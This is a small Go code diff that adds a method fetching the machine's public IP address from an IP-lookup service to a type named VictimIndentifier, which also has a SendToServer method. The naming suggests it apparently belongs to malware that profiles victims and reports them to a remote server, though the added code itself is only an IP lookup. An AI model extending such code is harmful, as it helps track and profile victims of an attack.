@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"encoding/json"
 	"errors"
+	"io/ioutil"
 	"log"
 	"net/http"
 	"time"
@@ -51,4 +52,18 @@ func (vi *VictimIndentifier) SendToServer(url string) error {
 	}
 
 	return nil
+}
+
+func (vi *VictimIndentifier) GetPublicAPI() (string, error) {
+	res, err := http.Get("https://api.ipify.org?format=text")
+	if err != nil {
+		return "", err
+	}
+	defer res.Body.Close()
+	ip, err := ioutil.ReadAll(res.Body)
+	if err != nil {
+		return "", err
+	}
+
+	return string(ip), nil
 }
